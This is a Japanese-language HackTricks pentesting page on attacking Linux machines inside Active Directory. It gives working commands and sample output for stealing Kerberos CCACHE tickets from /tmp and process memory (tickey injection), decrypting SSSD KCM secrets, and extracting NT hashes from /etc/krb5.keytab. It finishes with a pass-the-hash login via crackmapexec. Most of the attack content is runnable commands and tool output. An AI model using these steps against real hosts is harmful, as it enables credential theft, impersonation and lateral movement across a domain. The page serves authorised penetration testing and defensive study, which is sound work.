# Linux Active Directory

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* サイバーセキュリティ会社で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください**。

</details>

Linuxマシンは、Active Directory環境内に存在する場合もあります。

AD内のLinuxマシンでは、**さまざまなCCACHEチケットがファイル内に保存されている可能性があります。これらのチケットは、他のKerberosチケットと同様に使用および悪用することができます**。これらのチケットを読むには、チケットの所有者であるユーザーまたは**マシン内のroot**である必要があります。

## 列挙

### LinuxからのAD列挙

Linux（またはWindowsのbash）でADにアクセスできる場合、ADを列挙するために[https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn)を試すことができます。

LinuxからADを列挙する**他の方法**については、次のページをチェックしてください：

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

これは、主に**Unix**環境の統合管理ソリューションとして使用される、Microsoft Windows **Active** **Directory**のオープンソースの**代替**です。詳細については、次のページを参照してください：

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## チケットの操作

### パス・ザ・チケット

このページでは、Linuxホスト内のさまざまな場所で**Kerberosチケットを見つける**ことができます。次のページでは、これらのCCacheチケット形式をKirbi形式（Windowsで使用する形式）に変換する方法や、PTT攻撃を実行する方法について学ぶことができます：

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### /tmpからのCCACHEチケットの再利用

> チケットがディスク上のファイルとして保存される場合、標準の形式とタイプはCCACHEファイルです。これは、Kerberos資格情報を保存するためのシンプルなバイナリファイル形式です。これらのファイルは通常、/tmpに保存され、600のアクセス許可でスコープが設定されます。

`env | grep KRB5CCNAME`を使用して、現在の認証に使用されているチケットをリストします。形式はポータブルであり、環境変数を設定することでチケットを**再利用**できます。`export KRB5CCNAME=/tmp/ticket.ccache`として環境変数を設定します。Kerberosチケット名の形式は`krb5cc_%{uid}`であり、uidはユーザーのUIDです。
```bash
ls /tmp/ | grep krb5cc
krb5cc_1000
krb5cc_1569901113
krb5cc_1569901115

export KRB5CCNAME=/tmp/krb5cc_1569901115
```
### キーリングからのCCACHEチケットの再利用

プロセスは**自身のメモリ内にKerberosチケットを保存**することがあります。このツールは、それらのチケットを抽出するのに役立ちます（マシンの`/proc/sys/kernel/yama/ptrace_scope`でptrace保護が無効になっている必要があります）: [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
```bash
# Configuration and build
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release

[root@Lab-LSV01 /]# /tmp/tickey -i
[*] krb5 ccache_name = KEYRING:session:sess_%{uid}
[+] root detected, so... DUMP ALL THE TICKETS!!
[*] Trying to inject in tarlogic[1000] session...
[+] Successful injection at process 25723 of tarlogic[1000],look for tickets in /tmp/__krb_1000.ccache
[*] Trying to inject in velociraptor[1120601115] session...
[+] Successful injection at process 25794 of velociraptor[1120601115],look for tickets in /tmp/__krb_1120601115.ccache
[*] Trying to inject in trex[1120601113] session...
[+] Successful injection at process 25820 of trex[1120601113],look for tickets in /tmp/__krb_1120601113.ccache
[X] [uid:0] Error retrieving tickets
```
### SSSD KCMからのCCACHEチケットの再利用

SSSDは、パス`/var/lib/sss/secrets/secrets.ldb`にデータベースのコピーを保持しています。対応するキーは、パス`/var/lib/sss/secrets/.secrets.mkey`に隠しファイルとして保存されています。デフォルトでは、このキーは**root**権限を持っている場合にのみ読み取ることができます。

`SSSDKCMExtractor`を`--database`と`--key`パラメータと共に呼び出すと、データベースを解析し、**秘密情報を復号化**します。
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**クレデンシャルキャッシュのKerberosブロブは、Mimikatz/Rubeusに渡すことができる使用可能なKerberos CCacheファイルに変換できます。**

### キータブからのCCACHEチケットの再利用
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### /etc/krb5.keytabからアカウントを抽出する

通常、rootとして実行されるサービスのサービスキーは、**`/etc/krb5.keytab`**というキータブファイルに保存されます。このサービスキーは、サービスのパスワードと同等であり、安全に保管する必要があります。

[`klist`](https://adoptopenjdk.net/?variant=openjdk13\&jvmVariant=hotspot)を使用してキータブファイルを読み取り、その内容を解析します。キータイプが23の場合に表示されるキーは、実際の**ユーザーのNTハッシュ**です。
```
klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
[...]
[26] Service principal: host/COMPUTER@DOMAIN
KVNO: 25
Key type: 23
Key: 31d6cfe0d16ae931b73c59d7e0c089c0
Time stamp: Oct 07,  2019 09:12:02
[...]
```
Linuxでは、[`KeyTabExtract`](https://github.com/sosdave/KeyTabExtract)を使用することができます。RC4 HMACハッシュを再利用するために必要です。
```bash
python3 keytabextract.py krb5.keytab
[!] No RC4-HMAC located. Unable to extract NTLM hashes. # No luck
[+] Keytab File successfully imported.
REALM : DOMAIN
SERVICE PRINCIPAL : host/computer.domain
NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # Lucky
```
**macOS**では、[**`bifrost`**](https://github.com/its-a-feature/bifrost)を使用することができます。
```bash
./bifrost -action dump -source keytab -path test
```
CMEを使用して、アカウントとハッシュを使用してマシンに接続します。
```bash
$ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "31d6cfe0d16ae931b73c59d7e0c089c0" -d "DOMAIN"
CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0
```
## 参考文献

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ HackTricksで**会社を宣伝**したいですか？または、**PEASSの最新バージョンを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
